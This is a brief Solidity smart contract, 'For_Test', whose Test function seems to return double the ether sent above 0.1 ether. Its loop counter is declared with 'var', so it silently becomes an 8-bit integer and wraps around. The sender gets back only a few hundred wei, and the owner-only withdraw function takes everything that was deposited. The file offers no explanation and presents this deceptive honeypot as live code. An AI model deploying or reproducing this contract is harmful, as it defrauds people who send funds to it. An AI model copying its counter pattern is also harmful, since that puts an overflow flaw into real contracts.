1 pragma solidity ^0.4.19;
2 
3 contract For_Test
4 {
5     address owner = msg.sender;
6     
7     function withdraw()
8     payable
9     public
10     {
11         require(msg.sender==owner);
12         owner.transfer(this.balance);
13     }
14     
15     function() payable {}
16     
17     function Test()
18     payable
19     public
20     {
21         if(msg.value> 0.1 ether)
22         {
23             uint256 multi =0;
24             uint256 amountToTransfer=0;
25              
26             
27             for(var i=0;i<msg.value*2;i++)
28             {
29                 multi=i*2;
30                 
31                 if(multi<amountToTransfer)
32                 {
33                   break;  
34                 }
35                 else
36                 {
37                     amountToTransfer=multi;
38                 }
39             }    
40             msg.sender.transfer(amountToTransfer);
41         }
42     }
43 }